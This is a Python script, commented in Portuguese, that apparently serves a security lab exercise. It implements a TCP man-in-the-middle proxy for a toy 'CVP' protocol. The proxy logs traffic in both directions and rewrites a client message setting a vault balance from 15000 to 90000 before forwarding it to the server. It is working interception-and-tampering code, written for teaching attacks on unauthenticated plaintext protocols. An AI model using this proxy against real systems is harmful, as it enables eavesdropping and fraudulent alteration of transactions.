
#!/usr/bin/env python3
"""Proxy TCP MITM para o laboratório CVP da Fase 2."""

import argparse
import socket
import threading
from datetime import datetime

ENCODING = "utf-8"
MAX_LINE_BYTES = 8192
LOG_LOCK = threading.Lock()


def log(mensagem: str) -> None:
    agora = datetime.now().strftime("%H:%M:%S")
    with LOG_LOCK:
        print(f"[{agora}] {mensagem}", flush=True)


def encaminhar(
    origem: socket.socket,
    destino: socket.socket,
    modificar: bool = False,
) -> None:
    """Encaminha um fluxo TCP, processando mensagens completas por linha."""
    buffer = bytearray()

    try:
        while True:
            dados = origem.recv(4096)
            if not dados:
                break

            buffer.extend(dados)

            if len(buffer) > MAX_LINE_BYTES and b"\n" not in buffer:
                log("Mensagem excedeu o limite configurado; sessão encerrada.")
                break

            while b"\n" in buffer:
                linha, _, restante = buffer.partition(b"\n")
                buffer = bytearray(restante)
                mensagem = bytes(linha) + b"\n"

                if modificar:
                    original = mensagem.decode(ENCODING, errors="replace").rstrip("\n")
                    if original == "SET cofre_saldo 15000":
                        mensagem = b"SET cofre_saldo 90000\n"
                        log(f"ALTERAÇÃO: {original!r} -> "
                            f"{mensagem.decode(ENCODING).rstrip()!r}")
                    else:
                        log(f"CLIENTE -> SERVIDOR: {original!r}")
                else:
                    log(f"SERVIDOR -> CLIENTE: "
                        f"{mensagem.decode(ENCODING, errors='replace').rstrip()!r}")

                destino.sendall(mensagem)

            if len(buffer) > MAX_LINE_BYTES:
                log("Fragmento de mensagem excedeu o limite; sessão encerrada.")
                break

    except (ConnectionResetError, BrokenPipeError, OSError) as erro:
        log(f"Encaminhamento encerrado: {erro}")
    finally:
        try:
            destino.shutdown(socket.SHUT_WR)
        except OSError:
            pass


def atender(cliente: socket.socket, endereco, args) -> None:
    servidor = None
    log(f"Nova sessão de {endereco[0]}:{endereco[1]}")

    try:
        servidor = socket.create_connection(
            (args.host_servidor, args.porta_servidor),
            timeout=5,
        )
        servidor.settimeout(None)

        cliente.settimeout(None)

        ida = threading.Thread(
            target=encaminhar,
            args=(cliente, servidor, True),
            daemon=True,
        )
        volta = threading.Thread(
            target=encaminhar,
            args=(servidor, cliente, False),
            daemon=True,
        )

        ida.start()
        volta.start()
        ida.join()
        volta.join()

    except OSError as erro:
        log(f"Erro na sessão {endereco}: {erro}")
    finally:
        for sock in (cliente, servidor):
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass
        log(f"Sessão encerrada: {endereco}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Proxy MITM para o protocolo CVP em laboratório isolado."
    )
    parser.add_argument("--host", default="0.0.0.0",
                        help="Interface local do proxy")
    parser.add_argument("--porta", type=int, default=5051,
                        help="Porta local do proxy")
    parser.add_argument("--host-servidor", default="10.89.0.10",
                        help="Endereço do servidor CVP")
    parser.add_argument("--porta-servidor", type=int, default=5050,
                        help="Porta do servidor CVP")
    args = parser.parse_args()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as servidor_proxy:
        servidor_proxy.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        servidor_proxy.bind((args.host, args.porta))
        servidor_proxy.listen(20)

        log(f"Proxy CVP escutando em {args.host}:{args.porta}")
        log(f"Destino configurado: {args.host_servidor}:{args.porta_servidor}")

        try:
            while True:
                cliente, endereco = servidor_proxy.accept()
                threading.Thread(
                    target=atender,
                    args=(cliente, endereco, args),
                    daemon=True,
                ).start()
        except KeyboardInterrupt:
            log("Encerrando proxy (Ctrl+C).")


if __name__ == "__main__":
    main()
